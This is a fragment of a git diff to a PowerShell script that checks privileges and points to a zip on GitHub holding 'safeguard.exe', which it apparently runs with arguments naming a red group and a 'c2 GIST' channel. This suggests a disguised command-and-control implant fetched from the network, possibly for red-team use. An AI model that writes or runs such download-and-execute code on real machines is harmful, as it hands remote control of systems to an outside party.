@@ -9,7 +9,7 @@ Write-Output "`n=== Privileges ==="
 whoami /priv
 
 # Configuration
-$zipUrl = "https://github.com/ghtimetodowork/asdfadsffasfasdasfasfdsdfasdfasdfasdfasdfasdfasdfasdfasdfsdfasdf/raw/refs/heads/main/safeguard.zip"
+$zipUrl = "https://github.com/ghtimetodowork/safeguard-exe/raw/refs/heads/main/safeguard.zip"
 $exeName = "safeguard.exe"
 $exeArgs = "-group red -v -c2 GIST -delay 4"
 
